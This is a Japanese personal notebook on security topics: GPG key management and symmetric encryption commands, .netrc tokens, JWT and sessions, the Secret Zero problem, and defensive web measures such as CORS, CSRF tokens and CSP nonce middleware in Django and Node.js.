                        鍵を編集するモードに入ります:  #search: GPG key ID
                            gpg --edit-key __KeyID__
                        （必要なら）主キーの期限を更新します:
                            延長する期間を入力します: |  #focus: 2y, save  #// expire と入力し、2年延長の場合 2y と入力します
                                gpg> expire
                                Changing expiration time for the primary key.
                                Please specify how long the key should be valid.
                                        0 = key does not expire
                                    <n>  = key expires in n days
                                    <n>w = key expires in n weeks
                                    <n>m = key expires in n months
                                    <n>y = key expires in n years
                                Key is valid for? (0) 2y
                                Key expires at Mon Sep 31 20:23:30 2026 JST
                                Is this correct? (y/N) y
                                ...
                                [ultimate] (1). __Name__ <yourname@example.com>
                                gpg: WARNING: Your encryption subkey expires soon.
                                gpg: You may want to change its expiration date too.
                                gpg: WARNING: No valid encryption subkey left over.
                                gpg> save
                        （必要なら）サブ キー の期限を更新します:  #search: update GPG subkey
                            編集中とするキーを設定します:
                                gpg> key 1   #// 1つ目の サブ キー
                            延長する期間を入力します:
                                #// 主キーの更新と同じ手順です
                        期限を再確認します:
                            gpg --list-keys
                        メモを更新します:  #search: my GPG key expires
                        鍵をバックアップします:
                            エクスポートします:  #search: export GPG
                            バックアップします:  #search: make Secret Vault in USB memory
                    公開鍵を表示します:
                        gpg --armor --export  __KeyID__ | less
                        #// __KeyID__ は #search: GPG key ID
                        #// パスワードの入力を求められます
                    エクスポート、インポートします: #keyword: export GPG
                        エクスポートします:  #// 秘密鍵と公開鍵をエクスポートします。 バックアップ、または他クライアントに移動・コピーします
                            mac の場合:
                                前提条件:
                                    #search: install GPG
                                テキスト形式にする場合:
                                    gpg --armor --export-secret-keys __KeyID__ > ~/__KeyID__.private-key.gpg
                                    #// 秘密鍵から公開鍵が作れるから不要？⇒ gpg --armor --export   __KeyID__ > ~/__KeyID__.public-key.gpg
                                    #// __KeyID__ は #search: GPG key ID
                                バイナリ形式にする場合:
                                    gpg --export-secret-keys __KeyID__ > ~/__KeyID__.private-key.gpg
                                    #// 秘密鍵から公開鍵が作れるから不要？⇒ gpg --export   __KeyID__ > ~/__KeyID__.public-key.gpg
                                #// --armor オプションを付けると出力ファイルはテキスト形式になります。 付けないとバイナリ形式になります。どちらでも構いません
                        USB メモリー などに移動して、インポートする PC に移動します:
                            パスフレーズを入力しないと使えないのである程度は安全です
                        インポートします: #keyword: import GPG  #// 秘密鍵と公開鍵をインポートします
                            mac の場合:
                                初回のみ:
                                    #search: install GPG
                                bash の場合: |
                                    gpg --allow-secret-key-import --import  ~/__KeyID__.private-key.gpg
                                        #// パスワードの入力を求められます
                                    または
                                    gpg --import  ~/__KeyID__.public-key.gpg
                                #search: GPG key ID
                            Windows の Kleopatra の場合:
                                Windows ボタン >> Kleopatra（と入力して選ぶ）>> インポート ボタン >> __KeyID__.private-key.gpg
                                #search: install GPG
                        登録されたことを確認します:
                            gpg --list-secret-keys
                        （必要なら）移動元の秘密鍵を削除します: #keyword: remove .gpg
                            USB メモリー: rm  ____/__KeyID__.public-key.gpg
                            ローカル: rm ~/__KeyID__.public-key.gpg
                    編集します:
                        開始: gpg --edit-key __KeyID__
                        パスワードの変更: gpg> passwd
                        その他, ヘルプ表示: gpg> help
                        終了: quit
                    暗号化します: #keyword: GPG 暗号化  #// encryption
                        秘密鍵方式:
                            暗号化: #keyword: GPG 暗号化 コマンド  #// 圧縮も行われます
                                サンプル: |  #// CentOS7
                                    $ cd ~/_gpg
                                    $ GPG_WORK="$HOME/gpg-work"
                                    $       ls  "${GPG_WORK}"  #// 存在しないこと。もし存在していたら GPG_WORK の値を変更します
                                    $       mkdir -p  "${GPG_WORK}"
                                    $       chmod 700 "${GPG_WORK}"
                                    $ ps aux | grep gpg  #// gpg-agent --daemon --homedir __GpgHome__ が見つからないこと
                                    $       gpg-agent --daemon --homedir "${GPG_WORK}"
                                                gpg-agent[19133]: directory `/home/user1/gpg-work/private-keys-v1.d' created
                                                GPG_AGENT_INFO=/home/user1/gpg-work/S.gpg-agent:19134:1; export GPG_AGENT_INFO;
                                                gpg-agent[19134]: gpg-agent (GnuPG) 2.0.22 started
                                    $ read -s -p "Enter GPG file passphrase: "  GPG_FILE_PASSPHRASE
                                            #// 入力したパスワードを安全な場所にメモします。-s オプションによりパスワードは表示されません

                                    $ echo "${GPG_FILE_PASSPHRASE}"  |  gpg --homedir "${GPG_WORK}"  --batch --yes --passphrase-fd 0 --symmetric  --output __EncryptedFilePath__  __PlainFilePath__
                                            #// --output が無い場合: ファイル名の末尾に .gpg が付いたファイルが出力されます
                                            #// echo が無い場合: #// 非推奨
                                            #//     gpg コマンド実行後にパスワードと Enter キー の入力が求められます（プロンプトは表示されません）。
                                            #//     ただし、入力されたパスワードが表示されてしまうため、非推奨です。
                                    $ unset GPG_FILE_PASSPHRASE
                                    $ echo  "${GPG_WORK}"
                                    $ gpg-connect-agent --homedir "${GPG_WORK}"  killagent /bye  #// ERR 67125247 End of file <GPG Agent> は無視できます
                                    $       ps aux | grep gpg  #// gpg-agent --daemon --homedir __GpGHome__ が見つからないこと
                                    $ rm -rf  "${GPG_WORK}"
                            復号化: #keyword: GPG 復号化
                                サンプル: |
                                    #// 復号化の前に必要なコマンドがあります  #search: GPG 暗号化 コマンド

                                    echo "${GPG_FILE_PASSPHRASE}"  |  gpg --homedir "${GPG_WORK}"  --batch --yes --passphrase-fd 0 --decrypt  --output __PlainFilePath__  __EncryptedFilePath__
                                            #// --output が無い場合: 復号化した内容が画面に表示されます
                                            #// echo が無い場合: #// 非推奨
                                            #//     gpg コマンド実行後にパスワードと Enter キー の入力が求められます（プロンプトは表示されません）。
                                            #//     ただし、入力されたパスワードが表示されてしまうため、非推奨です。
                                    #// 復号化の後にも必要なコマンドがあります  #search: GPG 暗号化 コマンド
                                オプション: 暗号化の説明を参照
                            応用:  #search: delayed scp
                構成:
                    GPG キー, 鍵:
                        （一覧など）:  #search: gpg --list-secret-keys
                        主キー: #keyword: GPG primary key,  GPG master key
                        サブ キー: #keyword: GPG subkey  #// 
                            表示:
                                期限切れではない場合:
                                    gpg --list-keys
                                期限切れの場合:
                                    コマンド:
                                        gpg --edit-key  __KeyID__
                                        gpg> list
                                        gpg> quit
                                    出力例: |  #focus: ssb  #// sec が主キー, ssb が サブ キー です。usage（用途）によって鍵を使い分けています
                                        sec  rsa4096/__KeyID__
                                            created: 2020-01-01  expires: 2026-01-01  usage: SC
                                        ssb  rsa4096/__SubKeyID__
                                            created: 2020-01-01  expires: 2024-01-01  usage: E
                            更新: #keyword: update GPG subkey
                        期限:  #search: gpg --list-secret-keys
                参考:
                    Git でコミット作成者を偽装する方法／署名付きコミットでの対策: #ref: https://qiita.com/s6n/items/bb869f740a53a3bf169e
                トラブルシューティング:
                    - #// error: gpg failed to sign the data
                        手順: Git コミット など
                        ログ: |
                            git commit -m "2024-11-30"
                                gpg: skipped "____": Unusable secret key
                                gpg: signing failed: Unusable secret key
                                error: gpg failed to sign the data
                                fatal: failed to write commit object
                            gpg --list-secret-keys
                                [ expired] ...
                        対処:
                            期限を更新します  #search: extend GPG
        トークン: 
            概要: パスワードを確認してから発行される。ユーザーの認証のみ
            アクセス トークン: #keyword:  #// サービスのセッションに与えられる ID とランダム値を含むハッシュ値
            ~/.netrc ファイル: #keyword:
                リスク:
                    特定のサーバーの特定の Linux ユーザー にログインできる人だけがアクセスできます  #search: chmod 600
                Git: #keyword: ~/.netrc Git,  ~/.netrc GitLab GitHub
                    git clone: |  #focus: __Token__  #// GitLab にアクセスする場合
                        grep  "gitlab.com"  ~/.netrc
                            見つからない場合や更新する場合は以下へ。それ以外は終了。
                        vi ~/.netrc
                            machine gitlab.com        #// ホスト名に複数の login/password を設定できません。最初または最後が使われます。なので、デプロイトークンは 1つしか指定できません
                                login __User__        #// グループ アクセス トークン の場合は、oauth2 固定。デプロイトークンの場合は、トークン生成時に指定したユーザー名
                                password __Token__
                        chmod 600 ~/.netrc
                        clear

                        git clone ____
                コメント:
                    # __Comment__
                    ただし、curl と git のみ
                非対応:
                    -   1つのホストに複数のユーザー/パスワード
                    -   公開鍵認証 (SSH)  #search: ~/.ssh/id_rsa
                    -   OAuth2 の「リフレッシュトークン」や Bearer Token（HTTP ヘッダー直指定が必要なもの）
                    -   複雑な認証フロー（2FA、SAML、OIDCなど）
            トークン ベース の認証:
                OIDCやSAML。JWTと呼ばれる、暗号化されたJSONで記載されたフォーマットが一般的です。
                ステートレス。サーバーから送られるトークンをクライアントはただ送り返すだけ。
                トークンはクライアントの端末に保存される。
                トークンはブラウザに保存する必要がないため、CLI などブラウザを使用しないアプリケーションにも使うことができます。
            アクセス トークン とセッションID:  #ref: https://yassanabc.com/2021/07/21/【認証】トークンベースとセッションベースの違/
            JWT: #keyword:  #//「ジョット」
                構造: #// ヘッダ.ペイロード.署名 の文字列
                    JWTヘッダ:  #// Base64Url エンコード
                        alg: 署名アルゴリズム
                        typ: トークンの種類
                    JWTペイロード:  #// Base64Url エンコード
                        クレーム(claim): #// JWT が送る情報。ユーザー名、権限など。RFC7519
                            予約済みクレーム:
                            パブリック クレーム:
                            プライベート クレーム:
                        サンプル: |
                            {"user_name":"John Doe","admin":true}
                    署名:
                        秘密鍵で暗号化された署名
                        base64Url(HMACSHA256( base64Url(header) + "." + base64Url(payload), secret_key))
                手順:  #ref: typrm-imagees/2023/JWT認証.png
                    ログイン: クライアントの端末で、ユーザー名、パスワードを入力し、サーバーに暗号化して送信します
                    認証と発行: サーバーがユーザーを認証したら、JWT を発行して返送します。その JWT はサーバーが持つ秘密鍵で暗号化されています。JWT はサーバーに保存しても構いません
                    リクエスト: クライアントからサーバーに HTTPS リクエストを送る際、Authorization ヘッダーに JWT を付けます
                Web サイト:
                    jwt.ms:  #ref: https://jwt.ms/
                        #ref: https://learn.microsoft.com/ja-jp/azure/active-directory/develop/access-tokens
                CLI:  #ref: https://github.com/mike-engel/jwt-cli
                #ref: https://unit42.paloaltonetworks.jp/jsonwebtoken-vulnerability-cve-2022-23529/
            OIDC, OpenID Connect: #keyword:  #// 複数のサイトに対する認証および承認するためのプロセスの標準
                _: 複数のアプリにアクセスするために 1 つのユーザー名とパスワードで 1 回サインインするだけで済みます。
                    #ref: https://www.microsoft.com/ja-jp/security/business/security-101/what-is-openid-connect-oidc
        セッション:
            概要: パスワードを確認してから発行される、サーバーとユーザーとの接続。 HTTP の場合、Cookie に保存される。
                #ref: https://qiita.com/hththt/items/07136ad74127999df271#セッション基本
            手順:
                サーバー）HTTP ページをサーバーからブラウザーへ返信:
                クライアント）暗号化したログイン情報をサーバーへ送信:
                サーバー）セッションID を新規作成し、セッションの情報を記録:
                サーバー）セッションID をブラウザーへ送信:
                クライアント）セッションID をブラウザー内に保存:
            セッション ID: 
                概要: ユーザの状態を管理するたに適宜作られる、サーバーとユーザーとの接続に関する ID。
            セッション変数:
                概要: ユーザの状態の格納場所。Cookie の key value
            格納場所:
                ファイルの場合:  #// セッションが大量の場合は不向き
                    設定: Laravel6 の （デフォルト）
                    パス: storage/framework/sessions/__SessionID__   #// 未確認
                データベースの場合:  #ref: https://qiita.com/miyatomo1122/items/c6949bf4e3722f1c7105#databaseでの管理
                    設定:
                        Laravel6:
                            .env:
                                SESSION_DRIVER=database
                            config/session.php: |
                                'driver' => env('SESSION_DRIVER', 'database'),
            有効期限:
                #ref: http://pentan.info/php/session_gc.html
        API キー: #keyword:
            概要: API 提供者が発行するハッシュ値。ユーザーを識別し、有効なユーザーではないときは API が使えません。
            管理方法:  #search: client password
        ダーク パターン: #keyword: ダークパターン, 騙し 詐欺 ソーシャル エンジニアリング UI 悪意 パスワード 個人情報 分かりにくい 退会
            ユーザーが無意識に不利な行動を取るように設計された、悪意のあるデザイン
            #ref: https://gigazine.net/news/20240719-collection-of-dark-pattern/
        Windows:  #search: 資格情報マネージャー
        Linux >> hosts ファイル:  #search: Linux hosts file
        SSH:  #search: ssh
        HTTP:  #search: OpenSSL
        Git:  #search: git authentication
    認可: #keyword: Authorization,  権限  #glossary:
        ACL:  #// Access Control List
        RBAC:  #// Role-based access control。ロール ベース アクセス 制御
        テスト:  #search: 権限 テスト
        ファイアーウォール:  #search: iptables
    Secret Zero 問題:  #keyword: Secret Zero Problem,  シークレット・ゼロ問題,  Secret Zero,  Secret 0,  secret0,  last one key of key 鍵の鍵 最後に残る鍵 最初の鍵 ゼロ ブートストラップ問題に似た問題
        #ref: https://infisical.com/blog/solving-secret-zero-problem
        #ref: https://www.google.com/search?q=Secret+Zero+Problem
        _: 以下の認証方式のうち、「ecret Zero ベースの認証」に関する問題です
        シークレットベースの認証: #keyword:
            秘密情報へアクセスするためのトークンやパスワード Secret 1, 2, 3... を、App Zone の中のホストに置きます。
            ローテーションするときに、すべてのホストの中を更新する必要があります。
            シークレットの大元（コピー元、マスター）の置き場所を決めておきます。
        Secret Zero ベースの認証: #keyword: 
            シークレット管理システムにアクセスするためにホストを識別するトークン Secret 0 を、App Zone の中のホストに置きます。
            Secret 1, 2, 3... をローテーションするときに、シークレット管理システムの中だけ更新すればよくなります。
            Secret 0 をローテーションするときだけ、ホストの中を更新する必要があります。
            Secret 1, 2, 3... は Vault などで管理できるが、
            秘密情報を渡せる相手であることを信頼させるために、App Zone の中のホストに置くトークン Secret 0 の管理が必要。
        アイデンティティベースの認証: #keyword:
            プラットフォームが動的に認証情報を提供します。
            Secret 0 などを App Zone の中のホストに置く必要がありません。
        シークレットベースと Secret 0 ベースの共通:
            App Zone に何かしら認証情報を置くのは避けられない。→ これは Vault を使っても同じ。
            ❗ ただし置くのは “危険な長寿命パスワード” ではなく
            → アイデンティティベースの認証トークン
            → 期限つき、動的に更新。Vault Agent での自動トークン更新
            → 限定権限
            → 監査可能
        App Zone:  #search: ネットワーク分離
    暗号と乱数:
        暗号: #keyword: crypto
            cipher: #keyword:　 #// 暗号方式（という概念の名前）。「サイファー」と読む。ハッシュ関数とは異なる
                共通鍵暗号: #keyword:  #// 暗号化と復号化の両方で共通の鍵
                    AES-256: 256bit の AES 方式 共通鍵暗号  #keyword:
                公開鍵暗号: #keyword: #// 暗号化と復号化の異なる鍵
                    送信手順:
                        送信側が、受信相手の公開鍵を入手する:
                        送信側が、受信相手の公開鍵で暗号化して送る:
                        受信側が、自分の秘密鍵で復号化する:
                    RSA: #keyword:
                ブロック暗号: #// 128・192・256bitのデータをまとめて暗号化します。処理の負荷が小さいです。
                    CBCモード: 初期化ベクトルを指定して、前のブロックと排他的論理和します
                    初期化ベクトル: #keyword: IV, initialization vector, 初期化ベクトル
                        暗号化する平文を推測されにくくするための文字列。
                        ソルトとの違いは、初期化ベクトルは復号まで考慮する必要がある。
                    参考: #ref: https://it-trend.jp/encryption/article/64-0091
                ストリーム暗号: #// 1ビットまたは1バイトごとに暗号化します。
                    参考: #ref: https://it-trend.jp/encryption/article/64-0091
            #↓ 暗号方式のリスト  #keyword: 暗号方式
            ポスト量子暗号: #keyword: ポスト量子暗号, PQC
                _: 量子コンピュータの攻撃に耐性を持つよう設計された新しい暗号方式群。複数の暗号方式を含む分類名
                Kyber:  #// 鍵交換
                Dilithium:  #// 署名
                SPHINCS+:  #// 署名
                （参考）:
                    #ref: https://www.openssh.org/pq.html
            楕円曲線暗号: #keyword:
                ed25519: #keyword:  #search: ssh-keygen example
                    脆弱性: 量子コンピュータには脆弱（Shorのアルゴリズムで破られる可能性）が指摘されているが、今のところ安全
                楕円曲線: #keyword:  #ref: https://x.com/makaya_t_math/status/1908318721820811296
                    AI Caht:  #ref: https://claude.ai/chat/94d823ad-22e3-44df-a88d-f7c6d3f10d88
                    基本, Weierstrass 標準形: y² = x³ + ax + b
                    判別式: Δ = -16(4a³ + 27b²)  #// discriminant
                    特異性: #keyword:  #// Singularity
                        _: 曲線や曲面が特異（singular）であるとは、
                            その点で「滑らかでない」「尖っている」「自己交差している」などの異常な状態にあることを指します。
                        数学的定義:
                            曲線 f(x, y) = 0 上の点 (a, b) が特異点である ⟺ その点で偏微分がすべて消える：
                                ∂f/∂x(a, b) = 0 かつ ∂f/∂y(a, b) = 0
                            これは「接線の傾きが定まらない」ことを意味します。
                        
                    コホモロジー論とモチーフ:  #ref: https://www.math.kyoto-u.ac.jp/~tetsushi/files/hokudai200609.pdf
                        コホモロジー: 位相幾何学において，図形の「形」を表す群やベクトル空間
                        保型形式: #keyword:  #// ほけいけいしき  #ref: https://www.math.kyoto-u.ac.jp/~tetsushi/files/hokudai200609.pdf  >> p5
                        ラグランジュ対応: #keyword: Langlands 対応
                        楕円曲線の判別式に対応:
                            モジュライ理論的には∆は楕円曲線の「判別式」に対応しており，整数論のみならず，複素関数論，代数幾何学，数理物理，組み
                            合わせ論などにも現れる重要な対象である．
            その他:
                AES:
                RSA:
            #↓ アプリ
            iPhone:
                Face ID:  #keyword: Face ID iPhone 顔認証
                    URL に対応したパスワードの保存内容を削除します:
                        iPhone >> 設定 >> パスワード >>（検索）>> パスワードを削除
            McAfee True Key の セーフ ノート:
                起動: McAfee (mc) で検索
                マスターpass: 原身位置
                基本設定: #//（右下）
                    自動サインアウト: 30秒
                    セキュリティ レベル: 高度
            iSH:
                apk add gnupg でインストールできるが、
                プレーン テキスト をコマンドに入力できない。（履歴に残ってしまう）
            Node.js: #search: Node.js crypto encrypt
            QPDF: #// 実行ファイル
                参考: #ref: https://stackoverflow.com/questions/60562788/encrypt-pdf-file-using-node-qpdf
        乱数: #keyword: random
            シード: #keyword:  #// 乱数を生成する元となる値。同じシードなら同じ乱数が得られてしまう
            （パスワード ペア）:  #search: new password pair
        暗号化転送: #keyword: encrypted transfer,  transfer secrets
            転送プロトコル:
                #search: scp, https, sftp
            鍵の管理:
                #search: delayed scp
        パスワード:  #search: password
    防御, 対処: #// ネットワークを使った悪意のある操作をさせない方法
        IPA:  #// 安全なウェブサイトの作り方,  安全な SQL の呼び出し方
            安全なウェブサイトの作り方: #keyword:  #ref: https://www.ipa.go.jp/security/vuln/websecurity.html
                #keyword: セキュア プログラミング
                #↓ 1.ウェブアプリケーションのセキュリティ実装
                1．1 SQLインジェクション:  #ref: https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_1.html
                    #search: SQL injection
                1．2 OSコマンド・インジェクション:  #ref: https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_2.html
                    #search: OS command injection
                1．3 パス名パラメータの未チェック／ディレクトリ・トラバーサル:  #ref: https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_3.html
                    #search: directory traversal
                1．4 セッション管理の不備: #keyword:  #search: session hijacking  #ref: https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_4.html
                1．5 クロスサイト・スクリプティング:  #search: XSS  #ref: https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_5.html
                1．6 CSRF（クロスサイト・リクエスト・フォージェリ）:  #search: CSRF  #ref: https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_6.html
                1．7 HTTPヘッダ・インジェクション: #search: HTTP header injection  #ref: https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_7.html
                1．8 メールヘッダ・インジェクション: #search: mail header injection  #ref: https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_8.html
                1．9 クリックジャッキング: #search: click jacking  #ref: https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_9.html
                1．10 バッファオーバーフロー: #keyword: buffer overflow  #ref: https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_10.html
                1．11 アクセス制御や認可制御の欠落:  #ref: https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_11.html
                    パスワード
                #↓ 2.ウェブサイトの安全性向上のための取り組み
                2.1 ウェブサーバに関する対策:
                    OS やソフトウェアの脆弱性情報を継続的に入手し、脆弱性への対処を行う:  #// ミドルウェアをバージョンアップします
                    ウェブサーバをリモート操作する際の認証方法として、パスワード認証以外の方法を検討する:  #// パスワード以外の認証
                    パスワード認証を利用する場合は、十分に複雑な文字列を設定する:  #// パスワードの認証
                    不要なサービスやアカウントを停止または削除する:  #// 棚卸
                    公開を想定していないファイルを、ウェブ公開用のディレクトリ以下に置かない:  #// 棚卸
                2.2 DNS に関する対策:  #// 乗っ取られないようにします
                    ドメイン名およびその DNS サーバの登録状況を調査し、必要に応じて対処を行う:
                    DNS ソフトウェアの更新や設定を見直す:
                2.3 ネットワーク盗聴への対策:  #// 通知方法、経路
                    通信経路を暗号化する:  #// https
                    重要情報は、メールで送らず、暗号化された https のページに表示する:
                    運営者がメールで受け取る重要情報を暗号化する:
                2.4 フィッシング詐欺を助長しないための対策:
                    EV SSL 証明書を取得し、サイトの運営者が誰であるかを証明する:  #search: EV SSL
                    フレームを利用する場合、子フレームの URL を外部パラメータから生成しないように実装する:  #search: CORS
                    リダイレクト先の URL として使用されるパラメータの値には、自サイトのドメインのみを許可するようにする:
                        ログイン成功後に、そのパラメータの値を利用して改めてリダイレクトするとき
                2.5 パスワードに関する対策:
                    初期パスワードは、推測が困難な文字列で発行する:
                    パスワードの変更には、現行パスワードの入力を求める:
                    入力後の応答メッセージが認証情報の推測のヒントとならない工夫をする:
                    入力フィールドでは、パスワードは伏せ字で表示されるようにする:
                    パスワードをサーバ内で保管する際は、平文ではなくソルト付きハッシュ値の形で保管する:
                2.6 WAF によるウェブアプリケーションの保護:  #search: WAF
                    #ref: https://www.ipa.go.jp/security/vuln/websecurity/ug65p900000196e2-att/000017316.pdf  >> WAF（Web Application Firewall）
                2.7 携帯ウェブ向けのサイトにおける注意点:
                    セッション管理に関する注意点:  #// 古い話
                    クロスサイト・スクリプティングに関する注意点:  #// 古い話
                    携帯 ID の使用に関する注意点:  #// 現在は ID ではないおおよそ特定できる情報しか得られないが
                    認証情報に関する注意点:  #// パスワードの注意
                        #ref: https://www.ipa.go.jp/security/vuln/websecurity/ug65p900000196e2-att/000017316.pdf  >> 「パスワード」や「暗証番号」など
            安全な SQL の呼び出し方: #search: SQL injection
        ISO/IEC 27000: #// 情報セキュリティに関する国際規格群, JISQ27000  #keyword:
            概要: #ref: https://ja.wikipedia.org/wiki/ISO/IEC_27000_シリーズ#制定済みの国際規格
            ISO/IEC 27001:  #keyword: #ref: http://kikakurui.com/q/Q27001-2014-01.html
        安全なソフトウェアの利用: #keyword: use safe software
            - 公式から配布されているもの
            - 開発環境のみや内部での使用
            - static link すると更新できなくなる（Go言語のデメリット）
            - セキュアな コンパイル オプション（ソース パッケージ の場合
        #search: ID, 個人情報, パスワード, 暗号, 乱数
        バックポート: #keyword: backport
            セキュリティパッチなどを、古いバージョンに適用すること
        実行ファイルの数: #keyword: executable file count for security
            #// Go 言語などライブラリのパッケージを含む実行ファイルについて
            - システムで多くの種類の実行ファイルを作らないほうが、セキュリティ対応のためのバージョンチェックが簡単になります
            - 1つの実行ファイルで複数のサービスを提供させます
        CORS: #keyword:  #ref: ${programming}/ネットワーク・セキュリティ/!ネットワーク・セキュリティ.svg#CORS
            目的: CSRF対策。偽物のサイトにある HTML を開いたときの WebAPI リクエストを拒否するため
                WebAPIで得られる被害者の情報を漏洩させないため。
                被害者が意図しない書き込みをしないため。
                攻撃者にアカウントを持たせるため
            防御方法: #// 公式のサイト（オリジン）以外から来る WebAPI リクエストを拒否する
                フロントエンド:
                    Fetch API:
                        mode cors を設定します: |
                            fetch('https://trusted-api.co.jp', {
                                mode: 'cors'
                            });
                    XHR: 特にやることはないです
                バックエンド:
                    GET または OPTIONS のレスポンスに下記のヘッダーを追加します:  #glossary:
                        Access-Control-Allow-Origin:
                            省略時:
                                Access-Control-Allow-Origin が指定されずにクロスオリジンでアクセスするとエラーになります
                                #ref: https://developer.mozilla.org/ja/docs/Web/HTTP/CORS/Errors/CORSMissingAllowOrigin
                    Django REST Framework:
                        #search: install Django REST Framework CORS
                    AWS:
                        CDK: #ref: ${programming}/ネットワーク・セキュリティ/Cloud/Cloud.svg#AWS_API_gateway_CDK_CORS
                    Azure:
                        #ref: ${programming}/ネットワーク・セキュリティ/Cloud/Cloud.svg#CORS_Azure_Functions
                    調べる:
                        特定の REST API で必要なヘッダーを追加してみます。
                        成功したら、すべての API にヘッダーを追加する（難しい）方法を実装します。
                プリフライト リクエスト: #keyword:
                    概要: HTTP OPTIONS メソッドを送信して、CORS の情報を取得することです
                    MDN: #ref: https://developer.mozilla.org/ja/docs/Glossary/Preflight_request
                参考:
                    なんとなく CORS がわかる...はもう終わりにする。: #ref: https://qiita.com/att55/items/2154a8aad8bf1409db2b#具体的な実装
            防御対象外:
                アカウントを持っている攻撃者による攻撃的な WebAPI リクエストは拒否できない。ban する必要がある
            参考:
                今日こそ理解するCORS(動画): #ref: https://youtu.be/yBcnonX8Eak
                Snap Note: #ref: ${programming}/ネットワーク・セキュリティ/!ネットワーク・セキュリティ.svg#CORS
        CSRF トークン: #keyword:
            目的: HTML に埋め込むトークン。セッション ID とは区別します。
                なりすましを防止します。
                CSRF対策はアクセスを許可するユーザーの メール アドレス に ワンタイム パスワード を送るようなことです。
                被害者が偽物の HTML を開いたときの WebAPI リクエストを拒否するため。
                WebAPIで得られる被害者の情報を漏洩させないため。
                被害者が意図しない書き込みをしないため。
            防御方法:
                概要: トークンを持たない HTML からの WebAPI リクエストを拒否する
            防御対象外:
                攻撃者本人による攻撃的な WebAPI リクエストは拒否できない。なぜなら公式から受け取ったトークンが見えるため。攻撃者はアカウント不要。
                たとえば、ゲームのハイスコア詐称。
        CSP, Content-Security-Policy: #keyword:  #ref: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
            概要: サーバー側で許可したコード以外を、クライアント側で実行しないようにします
            基本設定:
                HTTP ヘッダー: |
                    -   Content-Security-Policy: default-src 'self';   #// ← 最も厳しい設定です  #keyword: self only CSP
                    -   Content-Security-Policy: default-src 'self';  script-src 'self' 'sha256-__Hash__';  style-src 'self' 'sha256-__Hash__';
                    -   Content-Security-Policy: default-src 'self';  script-src 'self' 'sha256-__Hash__' 'unsafe-eval';  style-src 'self' 'sha256-__Hash__' 'unsafe-inline';
                対象 URL:
                    React (SPA) の場合、ホスト 相対 URL が '/' のリクエストに対して、Content-Security-Policy を追加します
            ディレクティブ: #keyword: CSP directive  #ref: https://developer.mozilla.org/ja/docs/Web/HTTP/Reference/Headers/Content-Security-Policy#ディレクティブ
                概要: default-src, script-src など、設定対象  #search: self only CSP
                一覧:  #ref: https://developer.mozilla.org/ja/docs/Web/HTTP/Reference/Headers/Content-Security-Policy#ディレクティブ
                default-src: #keyword: CSP default-src  #search: self only CSP
                script-src: #keyword: CSP script-src  #search: self only CSP
                style-src: #keyword: CSP style-src  #search: self only CSP
                frame-ancestors: #keyword: CSP frame-ancestors
            デバッグ:
                Content-Security-Policy-Report-Only: #keyword:
                    Content-Security-Policy を Content-Security-Policy-Report-Only に変えると、
                    ブロックされるときの原因がコンソールに表示されるだけになり、ブロックは行われません。
                    注意❗ Content-Security-Policy の場合、原因はコンソールに表示されません。（一部だけかも。'unsafe-eval' は表示されません）
                ブラウザーの開発者ツール: #keyword: CSP browser log
                    Edge >> 開発者ツール >> ネットワーク タブ >>（static 以外）>>（HTTP リクエスト）>> Content-Security-Policy
                    #// static な HTTP リクエスト には Content-Security-Policy が表示されません。
                原因の場所:
                    ブラウンザーの開発者ツールのコンソールを開き、ある問題があったソースの場所へのリンクをクリックします
            すべて静的ロードに変える場合:
                サービス提供者によるスクリプトや CSS 以外はブラウザーでブロックします
            インライン処理を禁止する:
                #// インライン スクリプト やインライン CSS は、ユーザーが変更できるため、セキュリティ リスク があります
                #// ライブラリによって、すべて静的ロードに変えることができません
                CSS:
                    # t.deploy = function() {
                    #     var e = this.sheet;
                    #     e && (e.options.link ? this.insertRules(e.rules) : this.element.textContent = "\n" + e.toString() + "\n")
                    # }
                    jss.min.js:  #ref: ./web/node_modules/jss/dist/jss.min.js
                    material-ui.production.min.js:  #ref: ./web/node_modules/@material-ui/core/umd/material-ui.production.min.js
            動的に変わる場合:
                nonce を使う場合: #keyword: nonce CSP  #// 「ナンス」と読む。毎回違うランダム値
                    HTTP ヘッダー: |  #focus: nonce
                        Content-Security-Policy: script-src 'self' 'nonce-__Nonce__';
                    HTML:
                        <script nonce="{{ csp_nonce }}">
                            // インラインスクリプト
                        </script>
                    注意:
                        -   ページにアクセスするたびにランダム値も変わります。
                            なので、nginx などの汎用 Web サーバー には Content-Security-Policy を設定できません。
                        -   HTML テンプレートと HTTP ヘッダーでランダム値を一致させる必要があります
                    実装コード:
                        Node.js の場合:  #focus: nonce
                            const crypto = require('crypto');
                            const nonce = crypto.randomBytes(16).toString('base64');

                            res.setHeader('Content-Security-Policy', `script-src 'nonce-${nonce}' 'strict-dynamic';`);
                        Python Django の場合: #keyword: Django nonce CSP  #ref: https://django-csp.readthedocs.io/en/latest/nonce.html#middleware
                            csp_nonce で参照する場合:
                                templates/____.html: |  #focus: csp_nonce  #// HTTP の body 部分
                                    <script nonce="{{ csp_nonce }}">
                                        // Content-Security-Policy の script-src の対象となるスクリプト
                                    </script>
                                __Middleware__.py: |  #focus: nonce  #// HTTP ヘッダー部分への追加と、テンプレートから参照できる変数の設定
                                    import base64
                                    import os
                                    from django.utils.decorators import method_decorator
                                    from django.views.decorators.csrf import csrf_protect
                                    from django.middleware.csrf import get_token

                                    class CSPMiddleware:
                                        def __init__(self, get_response):
                                            self.get_response = get_response

                                        def __call__(self, request):
                                            nonce = base64.b64encode(os.urandom(16)).decode('utf-8')
                                            request.csp_nonce_from_middleware = nonce

                                            response = self.get_response(request)

                                            response['Content-Security-Policy'] = (
                                                "default-src 'self'; "
                                                f"script-src 'self' 'nonce-{nonce}'; "
                                            )
                                            
                                            return response
                                __ViewFunction__.py: |  #focus: csp_nonce_from_middleware,  csp_nonce
                                    def index(self, request):
                                        return render(request, 'index.html', {
                                            'csp_nonce': request.csp_nonce_from_middleware,
                                        })
                                settings.py:  #// CSPMiddleware オブジェクトを起動するため
